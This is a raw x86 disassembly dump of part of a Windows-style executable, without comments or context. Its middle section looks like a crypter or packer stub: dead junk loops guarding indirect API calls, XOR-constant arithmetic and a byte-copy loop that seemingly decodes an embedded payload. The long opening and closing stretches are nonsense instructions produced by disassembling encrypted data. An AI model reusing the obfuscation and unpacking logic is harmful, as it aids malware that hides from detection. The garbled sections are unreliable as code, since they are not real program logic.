  403a04:	mov    ds:0x3e8cdd90,al
  403a09:	sbb    DWORD PTR [esi+0x6ab2b97e],ebp
  403a0f:	mov    cs,WORD PTR [edi-0x2c81a609]
  403a15:	pop    ss
  403a16:	pushf  
  403a17:	inc    edi
  403a18:	jl     0x403a09
  403a1a:	cli    
  403a1b:	mov    edx,0x511fdbc8
  403a20:	cmp    al,0x4d
  403a22:	sbb    BYTE PTR [edx+edx*8+0x256aba20],0xf2
  403a2a:	or     eax,0xe3023103
  403a2f:	out    dx,eax
  403a30:	xor    dl,BYTE PTR ds:0x1397a4e6
  403a36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a37:	loopne 0x403a4d
  403a39:	inc    ebx
  403a3a:	enter  0xa538,0xb8
  403a3e:	push   esi
  403a3f:	jge    0x403a0d
  403a41:	push   cs
  403a42:	std    
  403a43:	cs leave 
  403a45:	daa    
  403a46:	pushf  
  403a47:	pusha  
  403a48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a49:	out    0xcc,eax
  403a4b:	adc    BYTE PTR [ebp-0x6d93c83c],bl
  403a51:	cmp    eax,DWORD PTR [esi+0x5d2abc1d]
  403a57:	mov    ah,0xf4
  403a59:	out    0x1d,al
  403a5b:	adc    ebx,DWORD PTR [esi]
  403a5d:	pop    ebx
  403a5e:	(bad)  
  403a5f:	pop    esp
  403a60:	adc    eax,0xf0f62f65
  403a65:	jo     0x403a90
  403a67:	mov    al,BYTE PTR [edx+0x35db0347]
  403a6d:	add    eax,0xa787b405
  403a72:	cmc    
  403a73:	sbb    dl,dl
  403a75:	pop    es
  403a76:	fmul   DWORD PTR [ecx+ebp*8-0x6097460c]
  403a7d:	cdq    
  403a7e:	ret    
  403a7f:	lods   al,BYTE PTR ds:[esi]
  403a80:	ds push ebp
  403a82:	test   BYTE PTR [ecx+0x53ee8f47],bl
  403a88:	mov    eax,es:0xaf5d16b0
  403a8e:	cmp    al,dl
  403a90:	(bad)  
  403a91:	adc    BYTE PTR [ebp+0x71],bh
  403a94:	dec    edi
  403a95:	push   edx
  403a96:	(bad)  
  403a97:	sub    DWORD PTR [eax],ebp
  403a99:	pop    edx
  403a9a:	pushf  
  403a9b:	cmp    al,0xc3
  403a9d:	dec    esi
  403a9e:	sub    dh,ch
  403aa0:	lea    ebx,[ebx+ebp*8-0x1c31ae49]
  403aa7:	jnp    0x403ac1
  403aa9:	leave  
  403aaa:	cmp    eax,0xbf0d99bd
  403aaf:	add    DWORD PTR [eax-0x48e8aa24],eax
  403ab5:	stos   DWORD PTR es:[edi],eax
  403ab6:	(bad)  
  403ab7:	ins    DWORD PTR es:[edi],dx
  403ab8:	push   esp
  403ab9:	adc    ch,bh
  403abb:	mov    fs,WORD PTR [ecx+0x78]
  403abe:	imul   esi,DWORD PTR [ebx],0xaf7255c2
  403ac4:	arpl   WORD PTR [ecx+0x23e58e1b],bp
  403aca:	xchg   BYTE PTR [ebp-0x6d],cl
  403acd:	or     bh,BYTE PTR [esi-0x7833bfff]
  403ad3:	mov    cl,0x16
  403ad5:	adc    eax,0x89ddb443
  403ada:	xlat   BYTE PTR ds:[ebx]
  403adb:	mov    ecx,0x599ce7e2
  403ae0:	mov    WORD PTR [eax+ebp*8],ss
  403ae3:	popa   
  403ae4:	ret    
  403ae5:	inc    edx
  403ae6:	out    dx,eax
  403ae7:	xor    DWORD PTR [edx-0xe],ebx
  403aea:	outs   dx,BYTE PTR ds:[esi]
  403aeb:	cs loop 0x403a98
  403aee:	inc    esi
  403aef:	lods   eax,DWORD PTR ds:[esi]
  403af0:	pop    edx
  403af1:	lods   ax,WORD PTR ds:[esi]
  403af3:	pop    esp
  403af4:	popa   
  403af5:	mov    ecx,0xa66d782d
  403afa:	xor    eax,0x68f840e7
  403aff:	sub    BYTE PTR [edx-0x8a0fed8],dl
  403b05:	and    edi,DWORD PTR [eax-0x73]
  403b08:	repnz fnstsw WORD PTR [eax]
  403b0b:	mov    cl,0x9c
  403b0d:	icebp  
  403b0e:	push   ebp
  403b0f:	gs out dx,al
  403b11:	stos   DWORD PTR es:[edi],eax
  403b12:	xchg   edx,eax
  403b13:	xchg   edx,eax
  403b14:	retf   0x8280
  403b17:	stc    
  403b18:	jecxz  0x403b50
  403b1a:	sti    
  403b1b:	das    
  403b1c:	pop    ecx
  403b1d:	xchg   ebx,eax
  403b1e:	fwait
  403b1f:	js     0x403b24
  403b21:	(bad)  
  403b22:	push   ss
  403b23:	xor    BYTE PTR [ecx-0x5d8f08e5],cl
  403b29:	mov    eax,0x8cf1f382
  403b2e:	add    DWORD PTR [edx-0x5a],ebp
  403b31:	out    0x19,eax
  403b33:	adc    esi,DWORD PTR [ecx-0x60]
  403b36:	in     eax,dx
  403b37:	mov    eax,0x38e811f4
  403b3c:	outs   dx,BYTE PTR ds:[esi]
  403b3d:	jns    0x403b72
  403b3f:	xor    edx,DWORD PTR [esi+0x70]
  403b42:	pop    esp
  403b43:	ficom  WORD PTR [ebx*8-0x247ccf7c]
  403b4a:	rcl    DWORD PTR ds:0x68baf9c,0x7c
  403b51:	mov    al,0xfb
  403b53:	mov    ch,0xad
  403b55:	ror    bl,1
  403b57:	add    eax,0x3a619393
  403b5c:	es jae 0x403b02
  403b5f:	pop    esi
  403b60:	or     eax,edi
  403b62:	mov    ch,0x55
  403b64:	les    eax,FWORD PTR [edi-0xfdea83d]
  403b6a:	adc    DWORD PTR [ecx-0x6a],0x722c9bab
  403b71:	mov    edi,0x29ee2d73
  403b76:	js     0x403bd9
  403b78:	or     ecx,DWORD PTR [edx]
  403b7a:	sbb    BYTE PTR [edi-0x20551858],al
  403b80:	leave  
  403b81:	(bad)  
  403b82:	sahf   
  403b83:	mov    al,ds:0x82657640
  403b88:	shl    DWORD PTR [edi+eiz*1],0xc4
  403b8c:	inc    edx
  403b8d:	mov    ebp,0x5a207b88
  403b92:	mov    ch,0x6d
  403b94:	fistp  WORD PTR [edx]
  403b96:	ds loopne 0x403b7c
  403b99:	pop    ds
  403b9a:	xor    bl,BYTE PTR [eax+0x5fd0372b]
  403ba0:	aad    0x3e
  403ba2:	fild   WORD PTR [edx+eax*1]
  403ba5:	out    0x2a,al
  403ba7:	jle    0x403bf2
  403ba9:	or     eax,0x6cc9f6bd
  403bae:	stc    
  403baf:	aaa    
  403bb0:	jp     0x403b72
  403bb2:	xlat   BYTE PTR ds:[ebx]
  403bb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403bb4:	(bad)  
  403bb5:	mov    ds:0xe517e877,al
  403bba:	xor    bl,bl
  403bbc:	in     eax,0xcc
  403bbe:	or     eax,0x6a625f27
  403bc3:	jbe    0x403bba
  403bc5:	xchg   edx,eax
  403bc6:	pop    edi
  403bc7:	xchg   edx,eax
  403bc8:	inc    esi
  403bc9:	das    
  403bca:	pop    esp
  403bcb:	int    0xef
  403bcd:	adc    eax,0xc13e132b
  403bd2:	loop   0x403bca
  403bd4:	inc    ecx
  403bd5:	aas    
  403bd6:	dec    ecx
  403bd7:	inc    ebp
  403bd8:	inc    edi
  403bd9:	xchg   ecx,eax
  403bda:	xor    dh,ah
  403bdc:	sbb    DWORD PTR [edi+esi*8],edx
  403bdf:	repz fnstcw WORD PTR es:[edx+0x27075911]
  403be7:	xchg   ecx,eax
  403be8:	ror    BYTE PTR [esi+edx*2+0xb],0x4d
  403bed:	mov    eax,ds:0xecce2ff2
  403bf2:	push   ecx
  403bf3:	push   ecx
  403bf4:	iret   
  403bf5:	hlt    
  403bf6:	pop    ebx
  403bf7:	das    
  403bf8:	fidivr DWORD PTR [ecx+0x13]
  403bfb:	mov    al,0xab
  403bfd:	lock sub al,0x9f
  403c00:	push   es
  403c01:	push   es
  403c02:	mov    edi,ebp
  403c04:	sar    DWORD PTR [ebp+0x1480f9c9],0x75
  403c0b:	jo     0x403bfc
  403c0d:	je     0x403c09
  403c0f:	test   BYTE PTR [eax-0x7f],0x8d
  403c13:	jno    0x403ba6
  403c15:	pop    eax
  403c16:	sbb    DWORD PTR [ebp+ecx*1+0x36],eax
  403c1a:	(bad)  
  403c1b:	fild   DWORD PTR [ecx-0x19]
  403c1e:	addr16 stc 
  403c20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c21:	je     0x403c96
  403c23:	out    dx,eax
  403c24:	push   cs
  403c25:	in     al,dx
  403c26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c27:	xchg   edi,eax
  403c28:	scas   eax,DWORD PTR es:[edi]
  403c29:	adc    ecx,DWORD PTR [ecx-0x79]
  403c2c:	or     DWORD PTR [edi+0x3b7dc6b6],edx
  403c32:	jmp    0x403bbd
  403c34:	ja     0x403ca5
  403c36:	dec    ecx
  403c37:	leave  
  403c38:	add    ecx,ebx
  403c3a:	(bad)  
  403c3b:	(bad)  [ebp-0x5925670a]
  403c41:	pusha  
  403c42:	push   ss
  403c43:	clc    
  403c44:	mov    esi,0x69d4ca3
  403c49:	retf   
  403c4a:	lahf   
  403c4b:	add    al,0xcf
  403c4d:	fs retf 0x88ab
  403c51:	inc    esi
  403c52:	and    dh,BYTE PTR [esi+ebx*2]
  403c55:	cmp    DWORD PTR [ebp-0x5795e07b],ebp
  403c5b:	es clc 
  403c5d:	cs and al,0x45
  403c60:	aad    0x59
  403c62:	in     al,dx
  403c63:	or     DWORD PTR [edi+0x22],edi
  403c66:	leave  
  403c67:	repnz adc DWORD PTR ds:0xdb7a617c,eax
  403c6e:	je     0x403cd0
  403c70:	stos   BYTE PTR es:[edi],al
  403c71:	dec    edi
  403c72:	jmp    0x403c43
  403c74:	je     0x403c74
  403c76:	jnp    0x403cad
  403c78:	out    dx,al
  403c79:	(bad)  
  403c7a:	jnp    0x403c70
  403c7c:	mov    bl,0xa0
  403c7e:	stos   BYTE PTR es:[edi],al
  403c7f:	push   0x33
  403c81:	enter  0x4d89,0x8
  403c85:	mov    ecx,DWORD PTR [ebp+0x8]
  403c88:	mov    edx,DWORD PTR [ebp+0x8]
  403c8b:	xor    ecx,eax
  403c8d:	imul   edx,edx,0x5708f5
  403c93:	add    ecx,esi
  403c95:	lea    ecx,[ebp+ecx*4-0x64]
  403c99:	mov    edi,DWORD PTR [ecx]
  403c9b:	add    edx,edi
  403c9d:	mov    DWORD PTR [ecx],edx
  403c9f:	mov    ecx,DWORD PTR [ebp+0x8]
  403ca2:	xor    ecx,eax
  403ca4:	add    ecx,esi
  403ca6:	jne    0x4018ed
  403cac:	mov    ecx,DWORD PTR [ebp-0x8]
  403caf:	xor    ecx,eax
  403cb1:	mov    eax,DWORD PTR [ebp+0x10]
  403cb4:	add    ecx,esi
  403cb6:	mov    DWORD PTR [eax],ecx
  403cb8:	pop    edi
  403cb9:	pop    esi
  403cba:	pop    ebx
  403cbb:	leave  
  403cbc:	ret    0xc
  403cbf:	push   ebp
  403cc0:	mov    ebp,esp
  403cc2:	mov    DWORD PTR ds:0x41e1fc,0xf89c85b5
  403ccc:	pop    ebp
  403ccd:	mov    DWORD PTR ds:0x433000,0x2616
  403cd7:	jmp    0x41046f
  403cdc:	sbb    DWORD PTR ds:0x431018,edx
  403ce2:	mov    eax,0x80670b3f
  403ce7:	ret    
  403ce8:	push   ebp
  403ce9:	mov    ebp,esp
  403ceb:	sub    esp,0x10
  403cee:	mov    eax,0xf89c85b6
  403cf3:	mov    DWORD PTR ds:0x42f004,0x1b
  403cfd:	cmp    DWORD PTR ds:0x42f004,0x0
  403d04:	je     0x403d42
  403d0a:	cmp    DWORD PTR ds:0x42f004,0x29
  403d11:	jne    0x403d26
  403d17:	push   DWORD PTR [ebp-0xc]
  403d1a:	push   DWORD PTR [ebp-0x1c]
  403d1d:	push   DWORD PTR [ebp-0x18]
  403d20:	call   DWORD PTR ds:0x42b020
  403d26:	mov    edx,DWORD PTR ds:0x42f004
  403d2c:	dec    edx
  403d2d:	mov    DWORD PTR ds:0x42f004,edx
  403d33:	jmp    0x403cfd
  403d38:	xor    DWORD PTR ds:0x430018,0x7d7c
  403d42:	mov    DWORD PTR [ebp-0x4],eax
  403d45:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  403d4c:	and    DWORD PTR ds:0x432014,0x0
  403d56:	jmp    0x403d68
  403d5b:	mov    ecx,DWORD PTR ds:0x432014
  403d61:	inc    ecx
  403d62:	mov    DWORD PTR ds:0x432014,ecx
  403d68:	cmp    DWORD PTR ds:0x432014,0x1f
  403d6f:	jae    0x403db8
  403d75:	cmp    DWORD PTR ds:0x432014,0x4
  403d7c:	jne    0x403d93
  403d82:	push   DWORD PTR [ebp-0x18]
  403d85:	push   0x8961
  403d8a:	push   DWORD PTR [ebp-0x14]
  403d8d:	call   DWORD PTR ds:0x42b028
  403d93:	cmp    DWORD PTR ds:0x432014,0x3
  403d9a:	jne    0x403dad
  403da0:	mov    ecx,DWORD PTR ds:0x432014
  403da6:	inc    ecx
  403da7:	mov    DWORD PTR ds:0x432014,ecx
  403dad:	jmp    0x403d5b
  403db2:	add    ecx,DWORD PTR ds:0x42f000
  403db8:	mov    ecx,DWORD PTR [ebp-0x4]
  403dbb:	adc    DWORD PTR ds:0x430000,edi
  403dc1:	push   esi
  403dc2:	or     edx,esi
  403dc4:	mov    edx,0x7510893
  403dc9:	and    DWORD PTR ds:0x433014,0x0
  403dd3:	mov    esi,DWORD PTR ds:0x433014
  403dd9:	inc    esi
  403dda:	mov    DWORD PTR ds:0x433014,esi
  403de0:	cmp    DWORD PTR ds:0x433014,0x5
  403de7:	jne    0x403df8
  403ded:	push   0x42465f
  403df2:	call   DWORD PTR ds:0x42b02c
  403df8:	cmp    DWORD PTR ds:0x433014,0x4
  403dff:	jne    0x403e12
  403e05:	mov    esi,DWORD PTR ds:0x433014
  403e0b:	inc    esi
  403e0c:	mov    DWORD PTR ds:0x433014,esi
  403e12:	cmp    DWORD PTR ds:0x433014,0x15
  403e19:	jb     0x403dd3
  403e1f:	movzx  esi,BYTE PTR ds:0x433008
  403e26:	sub    DWORD PTR ds:0x43300c,esi
  403e2c:	xor    ecx,edx
  403e2e:	mov    esi,0x3272db
  403e33:	push   edi
  403e34:	sbb    edi,DWORD PTR ds:0x43001c
  403e3a:	mov    edi,DWORD PTR [ebp+0x10]
  403e3d:	add    ecx,esi
  403e3f:	mov    DWORD PTR ds:0x43100c,0x23cb
  403e49:	cmp    ecx,edi
  403e4b:	mov    DWORD PTR ds:0x42f000,0x3f40
  403e55:	je     0x403f20
  403e5b:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5e:	sub    edi,0x7e0f
  403e64:	mov    edi,DWORD PTR [ebp+0x10]
  403e67:	xor    eax,eax
  403e69:	xor    ecx,edx
  403e6b:	add    ecx,esi
  403e6d:	add    edi,0xfabdbef1
  403e73:	adc    eax,0xffffffff
  403e76:	xor    eax,0x0
  403e79:	mov    DWORD PTR [ebp-0xc],eax
  403e7c:	push   ebx
  403e7d:	xor    ebx,ebx
  403e7f:	xor    edi,0x8a29a123
  403e85:	mov    eax,ecx
  403e87:	add    eax,0xfabdbef1
  403e8c:	adc    ebx,0xffffffff
  403e8f:	xor    eax,0x8a29a123
  403e94:	xor    ebx,0x0
  403e97:	cmp    eax,edi
  403e99:	jne    0x403eb2
  403e9f:	cmp    ebx,DWORD PTR [ebp-0xc]
  403ea2:	je     0x403f1a
  403ea8:	jmp    0x403eb2
  403ead:	mov    esi,0x3272db
  403eb2:	mov    eax,DWORD PTR [ebp-0x4]
  403eb5:	mov    edi,DWORD PTR [ebp-0x8]
  403eb8:	xor    edi,edx
  403eba:	add    edi,esi
  403ebc:	mov    esi,DWORD PTR [ebp+0x8]
  403ebf:	imul   edi,ecx
  403ec2:	mov    ebx,DWORD PTR [ebp+0xc]
  403ec5:	xor    eax,edx
  403ec7:	add    eax,ecx
  403ec9:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  403ed0:	mov    BYTE PTR [edi+esi*1],al
  403ed3:	mov    eax,DWORD PTR [ebp-0x8]
  403ed6:	mov    esi,DWORD PTR [ebp+0x10]
  403ed9:	xor    eax,edx
  403edb:	xor    ebx,ebx
  403edd:	add    esi,0xfabdbef1
  403ee3:	adc    ebx,0xffffffff
  403ee6:	lea    ecx,[ecx+eax*1+0x3272db]
  403eed:	xor    edi,edi
  403eef:	xor    esi,0x8a29a123
  403ef5:	xor    ebx,0x0
  403ef8:	mov    eax,ecx
  403efa:	add    eax,0xfabdbef1
  403eff:	adc    edi,0xffffffff
  403f02:	xor    eax,0x8a29a123
  403f07:	xor    edi,0x0
  403f0a:	cmp    eax,esi
  403f0c:	jne    0x403ead
  403f12:	cmp    edi,ebx
  403f14:	jne    0x403ead
  403f1a:	mov    eax,0xf89c85b5
  403f1f:	pop    ebx
  403f20:	pop    edi
  403f21:	pop    esi
  403f22:	leave  
  403f23:	ret    0xc
  403f26:	push   ebp
  403f27:	mov    ebp,esp
  403f29:	sub    esp,0x78
  403f2c:	adc    DWORD PTR ds:0x43001c,0x7e2b
  403f36:	push   ebx
  403f37:	push   esi
  403f38:	push   edi
  403f39:	push   0x1f
  403f3b:	sub    DWORD PTR ds:0x43001c,0x56d8
  403f45:	lea    eax,[ebp-0x78]
  403f48:	sbb    DWORD PTR ds:0x43201c,0x71f8
  403f52:	push   eax
  403f53:	add    DWORD PTR ds:0x433018,0x431000
  403f5d:	push   0x0
  403f5f:	sub    DWORD PTR ds:0x42f01c,0x431004
  403f69:	call   DWORD PTR ds:0x42b044
  403f6f:	push   0x97898797
  403f74:	and    DWORD PTR ds:0x430000,0x1a8d
  403f7e:	call   DWORD PTR ds:0x42b010
  403f84:	and    DWORD PTR ds:0x43000c,0x0
  403f8e:	mov    ecx,DWORD PTR ds:0x43000c
  403f94:	inc    ecx
  403f95:	mov    DWORD PTR ds:0x43000c,ecx
  403f9b:	cmp    DWORD PTR ds:0x43000c,0x21
  403fa2:	jne    0x403fda
  403fa8:	push   0x67f5
  403fad:	push   0x706e
  403fb2:	push   DWORD PTR [ebp-0x1c]
  403fb5:	push   0x21f9
  403fba:	push   DWORD PTR [ebp-0x24]
  403fbd:	push   0x372d
  403fc2:	push   DWORD PTR [ebp-0x1c]
  403fc5:	push   0x6932
  403fca:	push   0x2439
  403fcf:	push   0x1248
  403fd4:	call   DWORD PTR ds:0x42b030
  403fda:	cmp    DWORD PTR ds:0x43000c,0x1d
  403fe1:	jb     0x403f8e
  403fe7:	add    DWORD PTR ds:0x432010,ebx
  403fed:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  403ff4:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  403ffb:	or     DWORD PTR ds:0x43101c,0x430014
  404005:	mov    ecx,DWORD PTR [ebp-0x4]
  404008:	adc    eax,0xdaa
  40400d:	mov    ebx,0x7510893
  404012:	xor    DWORD PTR ds:0x431004,ebx
  404018:	xor    ecx,ebx
  40401a:	mov    eax,0x3272db
  40401f:	add    ecx,eax
  404021:	mov    DWORD PTR [ebp-0x1c],ecx
  404024:	and    DWORD PTR ds:0x432010,0x0
  40402e:	jmp    0x404040
  404033:	mov    ecx,DWORD PTR ds:0x432010
  404039:	inc    ecx
  40403a:	mov    DWORD PTR ds:0x432010,ecx
  404040:	cmp    DWORD PTR ds:0x432010,0x18
  404047:	jae    0x40406f
  40404d:	cmp    DWORD PTR ds:0x432010,0x20
  404054:	jne    0x40406a
  40405a:	push   0x43201c
  40405f:	push   0x7111
  404064:	call   DWORD PTR ds:0x42b058
  40406a:	jmp    0x404033
  40406f:	mov    ecx,DWORD PTR [ebp+0x14]
  404072:	adc    DWORD PTR ds:0x430004,0x3b44
  40407c:	test   ecx,ecx
  40407e:	mov    DWORD PTR ds:0x42f024,0xafb
  404088:	je     0x404096
  40408e:	mov    ecx,DWORD PTR [ebp+0x14]
  404091:	mov    ecx,DWORD PTR [ecx]
  404093:	mov    DWORD PTR [ebp-0x1c],ecx
  404096:	mov    ecx,0x7665
  40409b:	imul   edx,eax
  40409e:	or     DWORD PTR ds:0x433000,0x5016
  4040a8:	mov    esi,0x76532
  4040ad:	sbb    DWORD PTR ds:0x433008,0x6d64
  4040b7:	add    edx,ecx
  4040b9:	xchg   esi,ecx
  4040bb:	or     esi,DWORD PTR ds:0x431010
  4040c1:	mov    edi,0x54354
  4040c6:	sub    edx,edi
  4040c8:	xor    DWORD PTR ds:0x43000c,edi
  4040ce:	mov    ecx,DWORD PTR [ebp-0x4]
  4040d1:	xor    DWORD PTR ds:0x42f008,0x2961
  4040db:	xor    ecx,ebx
  4040dd:	mov    DWORD PTR ds:0x43001c,0x16
  4040e7:	cmp    DWORD PTR ds:0x43001c,0x0
  4040ee:	je     0x404130
  4040f4:	cmp    DWORD PTR ds:0x43001c,0x1d
  4040fb:	jne    0x404114
  404101:	push   0x42f014
  404106:	push   0x430014
  40410b:	push   DWORD PTR [ebp-0x28]
  40410e:	call   DWORD PTR ds:0x42b05c
  404114:	mov    esi,DWORD PTR ds:0x43001c
  40411a:	dec    esi
  40411b:	mov    DWORD PTR ds:0x43001c,esi
  404121:	jmp    0x4040e7
  404126:	sbb    DWORD PTR ds:0x42f014,0x65a5
  404130:	add    ecx,eax
  404132:	mov    esi,DWORD PTR ds:0x42f008
  404138:	sbb    DWORD PTR ds:0x430008,esi
  40413e:	mov    DWORD PTR [ebp-0x8],ecx
  404141:	sub    DWORD PTR ds:0x432010,edx
  404147:	mov    ecx,DWORD PTR [ebp-0x14]
  40414a:	mov    DWORD PTR ds:0x432008,0x2441
  404154:	xor    ecx,ebx
  404156:	add    ecx,eax
  404158:	mov    DWORD PTR [ebp-0x24],ecx
  40415b:	mov    ecx,DWORD PTR ds:0x43201c
  404161:	sbb    DWORD PTR ds:0x433004,ecx
  404167:	mov    ecx,DWORD PTR [ebp-0x4]
  40416a:	xor    ecx,ebx
  40416c:	mov    DWORD PTR ds:0x430000,0x1b
  404176:	cmp    DWORD PTR ds:0x430000,0x0
  40417d:	je     0x4041b9
  404183:	cmp    DWORD PTR ds:0x430000,0x22
  40418a:	jne    0x4041a3
  404190:	push   0x561f
  404195:	push   0x42f014
  40419a:	push   DWORD PTR [ebp-0xc]
  40419d:	call   DWORD PTR ds:0x42b034
  4041a3:	xor    esi,esi
  4041a5:	add    esi,DWORD PTR ds:0x430000
  4041ab:	dec    esi
  4041ac:	mov    DWORD PTR ds:0x430000,esi
  4041b2:	jmp    0x404176
  4041b7:	neg    esi
  4041b9:	add    ecx,eax
  4041bb:	adc    DWORD PTR ds:0x42f014,edi
  4041c1:	mov    DWORD PTR [ebp-0x30],ecx
  4041c4:	or     DWORD PTR ds:0x430000,0x760b
  4041ce:	mov    esi,DWORD PTR [ebp-0x4]
  4041d1:	and    DWORD PTR ds:0x43100c,0x0
  4041db:	mov    ecx,DWORD PTR ds:0x43100c
  4041e1:	inc    ecx
  4041e2:	mov    DWORD PTR ds:0x43100c,ecx
  4041e8:	cmp    DWORD PTR ds:0x43100c,0x1f
  4041ef:	jne    0x404203
  4041f5:	push   DWORD PTR [ebp-0xc]
  4041f8:	push   0x7ec8
  4041fd:	call   DWORD PTR ds:0x42b038
  404203:	cmp    DWORD PTR ds:0x43100c,0x13
  40420a:	jb     0x4041db
  404210:	xor    esi,ebx
  404212:	mov    DWORD PTR ds:0x430018,0x19
  40421c:	cmp    DWORD PTR ds:0x430018,0x0
  404223:	je     0x40427d
  404229:	cmp    DWORD PTR ds:0x430018,0xc
  404230:	jne    0x404251
  404236:	push   DWORD PTR [ebp-0x24]
  404239:	push   0x1686
  40423e:	push   0x432008
  404243:	push   DWORD PTR [ebp-0x28]
  404246:	push   0x2eb1
  40424b:	call   DWORD PTR ds:0x42b000
  404251:	cmp    DWORD PTR ds:0x430018,0xd
  404258:	jne    0x40426b
  40425e:	mov    ecx,DWORD PTR ds:0x430018
  404264:	dec    ecx
  404265:	mov    DWORD PTR ds:0x430018,ecx
  40426b:	mov    ecx,DWORD PTR ds:0x430018
  404271:	dec    ecx
  404272:	mov    DWORD PTR ds:0x430018,ecx
  404278:	jmp    0x40421c
  40427d:	add    esi,eax
  40427f:	sub    DWORD PTR ds:0x432008,edx
  404285:	mov    ecx,DWORD PTR [ebp-0x24]
  404288:	or     DWORD PTR ds:0x433008,0x431008
  404292:	sub    ecx,eax
  404294:	jmp    0x4065e9
  404299:	div    ecx
  40429b:	and    DWORD PTR [edi+eax*1+0x64],edx
  40429f:	xchg   ebx,eax
  4042a0:	lods   eax,DWORD PTR ds:[esi]
  4042a1:	mov    edx,0x609c947b
  4042a6:	loop   0x40426d
  4042a8:	(bad)  
  4042a9:	sbb    bl,BYTE PTR [edi+0x62]
  4042ac:	bound  ebp,QWORD PTR [edx]
  4042ae:	pop    edi
  4042af:	bound  esp,QWORD PTR [edx-0x18]
  4042b2:	not    DWORD PTR [esi+0x64914afb]
  4042b8:	cmp    bl,BYTE PTR [ecx+ebp*2]
  4042bb:	mov    cl,0x5c
  4042bd:	sub    bl,BYTE PTR [edi+ecx*4]
  4042c0:	push   eax
  4042c1:	jmp    0x40431c
  4042c3:	(bad)  [ebp-0x30540b3e]
  4042c9:	sub    eax,0xa2d2fd1a
  4042ce:	xor    DWORD PTR [ebx+eax*8+0x445b219],0xe95bb68c
  4042d9:	adc    esp,DWORD PTR [esi+0x32]
  4042dc:	xlat   BYTE PTR ds:[ebx]
  4042dd:	pop    edi
  4042de:	in     eax,dx
  4042df:	adc    DWORD PTR [ebx+0x65261c22],ebx
  4042e5:	mov    esi,0x5f5fd7b5
  4042ea:	jmp    0x404331
  4042ec:	pop    ds
  4042ed:	sub    ebx,DWORD PTR [ebx-0x80ca859]
  4042f3:	inc    eax
  4042f4:	in     al,0x5f
  4042f6:	sbb    BYTE PTR [edx-0x12],0xb4
  4042fa:	mov    ah,0x4
  4042fc:	ins    DWORD PTR es:[edi],dx
  4042fd:	call   0x4bd8:0x72d89f
  404304:	jp     0x404305
  404306:	xor    DWORD PTR [esi+eiz*4-0x78],ecx
  40430a:	mov    al,ds:0xb808cd81
  40430f:	mov    DWORD PTR [esi],edx
  404311:	mov    ds:0x16b463e2,eax
  404316:	sbb    al,0x73
  404318:	out    dx,eax
  404319:	inc    ecx
  40431a:	and    ch,0x6a
  40431d:	mov    bl,0x48
  40431f:	test   al,0xfa
  404321:	mov    ah,0xb7
  404323:	sbb    DWORD PTR ds:0x7373e979,eax
  404329:	mov    dl,0xde
  40432b:	aad    0xa0
  40432d:	pop    ds
  40432e:	add    eax,0x369f7be1
  404333:	ds cmp eax,0xde129d49
  404339:	push   ss
  40433a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40433b:	imul   eax,edi,0x28ca071c
  404341:	mov    ds:0xfadd3fe5,al
  404346:	cs das 
  404348:	adc    al,0xd6
  40434a:	push   0x7fffbded
  40434f:	outs   dx,DWORD PTR ds:[esi]
  404350:	repnz xor DWORD PTR [ebp+0x32979845],ebp
  404357:	call   0xa797f165
  40435c:	shr    BYTE PTR [eax+0x6bdf90e7],1
  404362:	mov    ecx,0x4a59d9bf
  404367:	jb     0x404342
  404369:	cwde   
  40436a:	push   ecx
  40436b:	imul   ebp,DWORD PTR [ebx+edx*2+0x3],0x46032dfa
  404373:	jl     0x404348
  404375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404376:	xchg   esi,eax
  404377:	mov    ds:0xb04cb651,eax
  40437c:	(bad)  
  40437d:	aad    0x6d
  40437f:	call   0x5ca35f6a
  404384:	or     al,0x80
  404386:	leave  
  404387:	aad    0x99
  404389:	mov    BYTE PTR [esi],dl
  40438b:	and    edi,DWORD PTR [edi+0x5a8f6a02]
  404391:	cmp    DWORD PTR [esi-0x2060823f],ecx
  404397:	cmpxchg DWORD PTR [ebx+0x57],esp
  40439b:	push   ebp
  40439c:	mov    ah,0xd2
  40439e:	outs   dx,DWORD PTR ds:[esi]
  40439f:	fiadd  DWORD PTR [ebx]
  4043a1:	mov    eax,ds:0x7d9b592a
  4043a6:	jmp    0x93315ff0
  4043ab:	add    al,0x74
  4043ad:	ror    BYTE PTR [edi],cl
  4043af:	xchg   BYTE PTR [eax],ch
  4043b1:	dec    ebp
  4043b2:	popf   
  4043b3:	and    al,0xfe
  4043b5:	and    DWORD PTR [edx-0x7f],ebx
  4043b8:	mov    gs,WORD PTR [ecx]
  4043ba:	add    BYTE PTR [eax],0xd6
  4043bd:	mov    DWORD PTR [ebp-0xb36b5f4],esp
  4043c3:	retf   0x63d8
  4043c6:	inc    edx
  4043c7:	cmp    DWORD PTR [edi-0x4b],eax
  4043ca:	arpl   bx,bx
  4043cc:	pusha  
  4043cd:	(bad)  
  4043ce:	mov    al,0x83
  4043d0:	shr    DWORD PTR [ecx+0x6637023a],0xee
  4043d7:	mov    esp,0xa88ae5c4
  4043dc:	dec    ecx
  4043dd:	adc    DWORD PTR [ebx+0x69],ebx
  4043e0:	fnsave [eax-0x1a454fcb]
  4043e6:	ins    DWORD PTR es:[edi],dx
  4043e7:	push   esp
  4043e8:	mov    BYTE PTR [ecx+0x64],bh
  4043eb:	add    al,0x14
  4043ed:	inc    ebx
  4043ee:	fcomp  QWORD PTR [eax-0x19d851a]
  4043f4:	sub    BYTE PTR [ecx],dl
  4043f6:	addr16 (bad) 
  4043f8:	retf   
  4043f9:	mov    ch,0xd0
  4043fb:	out    0xc1,eax
  4043fd:	dec    edi
  4043fe:	xor    BYTE PTR [ebx+0x57ad9ace],dl
  404404:	jg     0x4043ea
  404406:	mov    eax,ds:0xe8892c5f
  40440b:	dec    BYTE PTR [edx]
  40440d:	ss scas eax,DWORD PTR es:[edi]
  40440f:	and    edx,esp
  404411:	icebp  
  404412:	repnz or eax,0x9570cdc6
  404418:	data16 jno 0x404456
  40441b:	shl    BYTE PTR [edx],1
